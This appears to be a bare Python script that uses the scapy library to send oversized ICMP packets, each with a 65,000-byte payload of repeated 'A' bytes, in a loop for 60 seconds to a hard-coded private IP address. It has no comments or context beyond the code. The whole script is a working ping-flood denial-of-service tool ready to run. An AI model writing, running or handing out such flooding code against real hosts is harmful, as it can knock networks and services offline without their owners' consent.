from scapy.all import IP, ICMP, send
import time

dest_ip = "172.20.10.6"
duration = 60  # Duration of sending packets in seconds
payload_size = 65000
payload = b'A' * payload_size

start_time = time.time()
while time.time() - start_time < duration:
    icmp_packet = IP(dst=dest_ip) / ICMP() / payload
    send(icmp_packet, verbose=True)